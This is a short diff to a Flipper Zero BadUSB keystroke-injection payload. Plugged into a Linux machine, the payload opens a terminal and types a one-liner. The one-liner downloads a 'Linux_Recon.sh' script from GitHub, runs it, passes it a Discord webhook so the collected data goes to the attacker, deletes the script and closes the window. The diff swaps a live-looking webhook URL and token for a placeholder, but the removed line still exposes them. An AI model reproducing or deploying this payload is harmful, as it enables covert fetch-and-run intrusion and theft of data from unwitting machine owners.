@@ -8,5 +8,5 @@ REM Downloads and runs the Linux_Recon.sh script
 CTRL-ALT t
 DELAY 1000
 
-STRING curl -o Linux_Recon.sh https://raw.githubusercontent.com/edgecase963/Flipper_Zero_Collection/main/BadUSB/Recon/Linux_Recon.sh && chmod +x Linux_Recon.sh && ./Linux_Recon.sh "https://discord.com/api/webhooks/1071976848315133972/I4RYvx2q1QNpdGnwU3jZVg00M2zWOfEMcU--NXTaGQPq3ja1idoPo8c0wuZDcdaJhPl2" && rm Linux_Recon.sh && exit
+STRING curl -o Linux_Recon.sh https://raw.githubusercontent.com/edgecase963/Flipper_Zero_Collection/main/BadUSB/Recon/Linux_Recon.sh && chmod +x Linux_Recon.sh && ./Linux_Recon.sh "WEBHOOK_URL" && rm Linux_Recon.sh && exit
 ENTER
